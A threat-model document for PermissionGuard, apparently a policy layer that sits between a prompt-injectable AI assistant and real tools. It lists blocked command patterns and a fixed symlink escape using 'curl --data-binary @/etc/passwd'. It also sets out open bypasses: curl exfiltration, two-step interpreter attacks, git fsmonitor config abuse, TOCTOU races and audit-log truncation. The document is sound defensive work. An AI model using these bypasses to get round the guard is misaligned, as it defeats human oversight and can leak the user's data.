# Threat model

## What PermissionGuard is for

An AI assistant is connected to tools that can touch a real machine. The assistant is
**not trusted**: it can be confused, or it can be steered by hostile text it reads
(prompt injection in a file, web page or tool result). PermissionGuard sits between
the assistant and the tools so that a misbehaving assistant can do limited damage and
every attempt leaves evidence.

## Attacker model

| Attacker | Capabilities | In scope |
|---|---|---|
| Prompt-injected / misbehaving assistant | Can send any `ActionRequest`: any path, any command string, any params, in any order, repeatedly. Can read/write files inside the sandbox once allowed. | **Yes** |
| Assistant plus a careless approver | Same, and the human says "yes" to everything they are asked. | **Yes** (the guard must hold for everything that is denied outright; see "what approval does not cover") |
| Local attacker with write access to the project directory | Can edit the policy, the code, or the audit file. | **No** (only tamper *evidence* for the audit log) |
| Attacker with code execution as the same OS user | Can bypass anything in-process. | **No** |
| Malicious human operator | Approves things on purpose. | **No** |

## Prompt injection

The main way a well-behaved assistant turns hostile is text it reads: a file, a web page,
a tool result. PermissionGuard does **not** try to recognise injected text. Instead it
assumes injection will sometimes work and limits the damage:

- everything the assistant does goes through the same policy, no matter who "asked" for it;
- the policy never reads the assistant's reasoning or the conversation, so there is nothing
  to talk it out of;
- actions that survive the policy but are risky still need a human, who sees the exact
  path / argv / content;
- the tool results are the *only* channel back to the model, and they are plain data.

`demo_injection.py` shows this with a simulated assistant that obeys a poisoned file and
with real Claude (`--live`). The simulation is a worst case, not a claim about any model.
A live model may resist the injection, which means the guard stays idle; that is expected.

## MCP server

`permission_guard.mcp_server` puts the guard behind an MCP interface (stdio only). What that
changes for the threat model:

- **Scope.** Only calls made through this server are governed. A client that also has its own
  shell or file tools is not restricted by this policy.
- **Trusted computing base grows by one.** The human's answer arrives through the MCP client's
  elicitation UI. A buggy or malicious client, or an agentic client that auto-answers
  elicitations, can approve on the human's behalf. The server cannot tell the difference.
- **The model cannot approve itself.** The approval is resolved before the tool body runs and is
  not part of the tool's input schema, so a model cannot pre-fill or forge it. For the newer
  protocol, the SDK seals the multi-round state (authenticated encryption, bound to the request).
- **Fail closed** when the client cannot elicit, when prompts are disabled, when the answer is
  unreadable, or when approval turns out to be needed but was not asked.
- **No network exposure.** stdio only; there is deliberately no HTTP transport, because there is
  no authentication layer yet.
- **Privileges.** The server runs with the privileges of whoever started it. The sandbox is a
  policy boundary, not an OS boundary.

## What is enforced

| Risk | Control | Where | Tested in |
|---|---|---|---|
| Path traversal (`..`, absolute paths) | Lexical normalisation, then `resolve()` and containment check against the sandbox root | `policy.py` | `test_policy.py`, `test_bypass_attempts.py` |
| Symlink escape (file tools) | Escaping links are denied by the policy; links anywhere in a path are denied outright | `policy.py`, `paths.py` | `test_policy.py` |
| Symlink escape (command arguments) | Every argument, bare names included, is walked component by component as the kernel would resolve it; anything that escapes the sandbox or touches a symlink (even one pointing back inside) is denied. A plain word that equals a symlink's name is refused too | `commands.py`, `paths.py` | `test_policy.py`, `test_paths.py`, `test_bypass_attempts.py` (`test_regression_*`) |
| Symlink swapped after the check (TOCTOU), file tools only | `read_file`, `write_file` and `delete_file` open every path component with `O_NOFOLLOW` relative to a directory fd; a swapped-in symlink makes the open fail. **Not true for `run_command`**: see limitation 12 | `tools.py` | `test_tools.py`, `test_bypass_attempts.py` |
| Special files (FIFOs, devices) | `fstat` must report a regular file; `O_NONBLOCK` so opening a FIFO cannot hang | `tools.py` | `test_tools.py` |
| Obfuscated commands (`r''m`, `\rm`, `/bin/rm`, `RM`) | Commands are parsed into argv first; the program name is normalised; path-qualified programs are refused | `commands.py` | `test_commands.py`, `test_bypass_attempts.py` |
| Chaining and injection (`;`, `&&`, pipes, redirects, `$(...)`, backticks, newlines) | Anything needing a shell is denied; tools run without a shell anyway | `commands.py`, `tools.py` | same |
| Unknown or dangerous programs | Allowlist-first: unknown program = deny. Shells, wrappers (`env`, `xargs`, `timeout`...), privilege tools, disk tools, `ln`, `chmod` are explicitly denied with a reason | `default.yaml` | `test_policy.py` |
| Dangerous options on allowed programs | Per-program option rules: `rm -r`, `python -c/-m`, `curl -K`, `wget -e`, and the options that make a program follow symlinks on its own (`grep -R/-S`, `cp -L`, `diff -r`). `git` is limited to a short allowlist of subcommands (`status`, `log`, `diff`, `show`, `branch`; note `branch` can create and delete refs) | `default.yaml` | `test_policy.py` |
| Arguments that leave the sandbox | Every argument and every `--opt=value`, `key=value` or glued `-o/path` value is checked as a sandbox-relative path (see the symlink row); absolute paths, `~` and `..` escapes are denied; URLs limited to http(s) | `commands.py` | `test_policy.py` |
| `curl`/`wget` reading files through value syntax | `@file`, `name=@file`, `name=<file` and `--data-urlencode name@file` references get the same path check, so `curl --data-binary @/etc/passwd ...` is denied. A reference to an ordinary file inside the sandbox is still allowed (with approval): see limitation 3 | `commands.py` | `test_policy.py`, `test_bypass_attempts.py` (`test_regression_*`) |
| Resource abuse | Read/write size caps, command timeout (whole process group killed), output cap, command length cap | `tools.py`, `policy.py` | `test_tools.py` |
| Secret leakage to child processes | Children get a scrubbed environment (`PATH` with absolute entries only, `HOME`, `LANG`) and no stdin | `tools.py` | `test_tools.py` |
| Assistant tries to override limits or smuggle fields | Only the documented fields of a tool call are used; `limits` in tool input is ignored; malformed calls never reach the guard | `assistant.py`, `guard.py` | `test_assistant.py`, `test_guard.py` |
| Approving blind | The approval prompt shows the resolved absolute path, the parsed argv, and a content preview for writes | `approval.py`, `policy.py` | `test_approval.py`, `test_guard.py` |
| Bad policy file | Unknown keys, bad verdicts, wrong types refuse to load; an empty policy denies everything | `policy.py` | `test_policy_config.py` |
| Crashes turning into "allow" | Policy exception = deny; approver exception or closed stdin = deny; tool exceptions are caught and logged | `guard.py`, `approval.py` | `test_guard.py` |
| Actions without a record | The decision is written **before** the tool runs; if the audit write fails the tool does not run | `guard.py` | `test_guard.py` |
| Silent log edits | Hash chain over every entry; `python -m permission_guard verify` detects modification, deletion, insertion and reordering of entries (not removal of the newest ones: limitation 5) | `audit.py` | `test_audit.py` |
| Not knowing what was written | Every `write_file` row (authorized, ok, error, blocked) carries the SHA-256 of the requested content, covered by the chain; `verify --sandbox DIR` compares it with the file on disk. A mismatch means the file changed outside the audited write path (commands are not hashed), so it is a flag, not proof of tampering | `guard.py`, `audit.py` | `test_guard.py`, `test_audit.py`, `test_cli.py` |

## Security review findings (fixed)

| Finding | Fix | Pinned by |
|---|---|---|
| **Critical: sandbox escape through `run_command` with bare file names.** A symlink named `link` inside the sandbox pointing outside: `read_file('link')` was denied, but `cat link` was classified `ask` and, once approved, read the outside file, and `cp source link` overwrote it. Cause: arguments without `/`, `~` or `..` were treated as plain words and never resolved, and the commands run real programs that follow symlinks. Related: `curl --data-binary @/etc/passwd` was `ask`. | Every argument is resolved against the sandbox (`paths.py`) and refused if it escapes or touches a symlink; `@file` references are parsed; options that make a program follow symlinks are denied | `test_regression_*` in `tests/test_bypass_attempts.py` (they fail on the pre-fix code), `tests/test_paths.py`, `tests/test_policy.py` |
| Packaging: the wheel omitted the default policy, so the installed CLI crashed | The policy ships inside the package | `tests/test_docs.py`, and a CI job that installs the wheel in a clean venv |

## Known limitations

Limitations 1-6 and 12 are attacks that work today; each has an `xfail(strict=True)` test in
`tests/test_bypass_attempts.py`, and if one is ever fixed that test starts failing and must be
turned into a normal test. Limitations 7-11 are design properties and have no such test.

1. **Approved interpreters run arbitrary code.** `python script.py` is allowed after
   approval, and the script's content is not inspected. The human prompt is the only
   barrier. Mitigation today: inline code (`-c`, `-m`) is denied and the prompt shows argv.
2. **Two-step attacks.** `write_file run.py ...` (approved) followed by `python run.py`
   (approved) can do what neither step looks like alone. Each step is judged on its own.
3. **Exfiltration through allowed network programs.** `curl -d @notes.txt https://host` sends
   sandbox data out. `curl`/`wget` always require approval, but the policy does not model data flow.
   (`@file` references to files *outside* the sandbox or through a symlink are denied; ordinary
   sandbox files are not.)
4. **Hostile repository config.** A `.git/config` planted in the sandbox can make an
   allowed `git status` run commands (`core.fsmonitor`). `git` is limited to a short list of
   subcommands, but its configuration is not sanitised.
5. **Audit log: tail truncation.** Removing the newest entries leaves a valid chain. Store
   `AuditLog.last_hash()` somewhere the attacker cannot write (another host, a ticket, a
   signed commit) and compare it.
6. **Audit log: full rewrite.** Someone who can rewrite the whole file can recompute the
   entire chain. The chain gives tamper *evidence* against partial edits, not protection
   against a determined local attacker. Signing entries with a key held elsewhere would fix this.
7. **Session approvals are per `(action, target)`**, so approving `write_file notes.txt`
   once covers later writes of different content to the same file.
8. **Hard links** that already exist inside the sandbox are indistinguishable from files.
   The tools cannot create links (`ln` is denied), but pre-existing ones are not detected.
9. **POSIX only.** The sandbox relies on `openat`, `O_NOFOLLOW` and process groups
   (macOS and Linux). Windows is not supported.
10. **Single user, single machine.** Concurrent writers are serialised with `flock`, which
    does not protect against writers on a network filesystem that ignores locks.
11. **The model can still talk.** The guard controls actions, not words. A hijacked assistant
    can put misleading text in its answer to the user (for example, claim a blocked action
    succeeded). Show users the audit log, not only the assistant's summary.
12. **Command arguments are checked before the program runs, not when it opens the file.**
    The file tools open paths with `O_NOFOLLOW` and so have no check-then-use race; a real
    program (`cat`, `cp`, ...) opening a path cannot be given that guarantee. A symlink created
    or swapped in between the policy check (or the human's approval, which can take minutes)
    and the exec is not caught. Exploiting it needs something else that can create links inside
    the sandbox (an approved script, a concurrent actor); `ln` itself is denied. Re-evaluating
    the policy right before the exec would shrink the window but not close it; an OS-level
    sandbox would.

## Out of scope for this version

Authentication of who is approving, network-level egress control, containers or
seccomp-level isolation, rate limiting, and policy signing. The sandbox is a
*policy-level* boundary enforced in user space, not an OS-level jail. For hostile
workloads, run the guard inside a container or VM as well.
